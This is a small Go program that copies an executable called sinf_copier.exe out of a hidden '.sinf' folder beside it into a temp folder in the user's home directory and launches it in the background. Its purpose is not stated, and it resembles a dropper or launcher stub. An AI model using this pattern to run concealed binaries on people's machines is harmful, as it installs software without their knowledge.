package main

import (
    "io/ioutil"
	"log"
	"os"
	"fmt"
	"os/user"
	"os/exec"
	"path/filepath"
)

func checkErr(err error) {
    if err != nil {
        log.Fatal(err)
    }
}

func ensureDir(dirName string) error {

    err := os.Mkdir(dirName, os.ModeDir)

    if err == nil || os.IsExist(err) {
        return nil
    } else {
        return err
    }
}

func copy(src string, dst string) {
    
    data, err := ioutil.ReadFile(src)
    checkErr(err)
    // Write data to dst
    err = ioutil.WriteFile(dst, data, 0644)
    checkErr(err)
}



func main() {
	user, err := user.Current()
    if err != nil {
        panic(err)
	}
	appDir, err := filepath.Abs(filepath.Dir(os.Args[0]))
	tempDir := user.HomeDir + "\\temp"
	if err := ensureDir(tempDir); err != nil {
        fmt.Println("Directory creation failed with error: " + err.Error())
        os.Exit(1)
    }
	path := tempDir + "\\sinf_copier.exe"
	copy(appDir + "\\.sinf\\sinf_copier.exe", path)

	
	cmd := exec.Command(path, appDir)
    err = cmd.Start()

    if err != nil {
        println(err.Error())
        return
    }
}
